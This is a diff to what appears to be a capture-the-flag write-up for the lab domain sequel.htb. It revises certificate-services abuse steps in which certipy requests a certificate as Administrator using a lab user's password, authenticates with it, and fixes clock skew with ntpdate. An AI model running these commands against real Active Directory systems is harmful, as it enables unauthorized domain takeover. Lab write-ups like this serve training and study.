@@ -111,12 +111,18 @@ Certipy
 ```
 ![image](https://github.com/user-attachments/assets/1bf7e649-bcca-4ca8-9648-5670bfe5b0ed)
 
+# OR
 ```
-.\Certify.exe find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
+certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target 10.10.11.202 -template UserAuthentication -upn Administrator@sequel.htb -dns dc.sequel.htb -debug
+certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
 ```
-![image](https://github.com/user-attachments/assets/56d22ec3-ab2b-47c9-9ec8-35ea0f2a4c5c)
+![image](https://github.com/user-attachments/assets/801fdd01-029e-4076-b95c-ae91c65661a7)
 
 ```
-certipy req -u ryan.cooper -p NuclearMosquito3 -target 10.10.11.202 -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
+sudo service virtualbox-guest-utils stop
+sudo ntpdate -s 10.10.11.202
+certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
 ```
-![image](https://github.com/user-attachments/assets/9b2a463d-f72f-4a5e-89a2-e829faef9f46)
+![image](https://github.com/user-attachments/assets/1327812c-7770-4ad0-bddf-bf280b2d149d)
+
+```
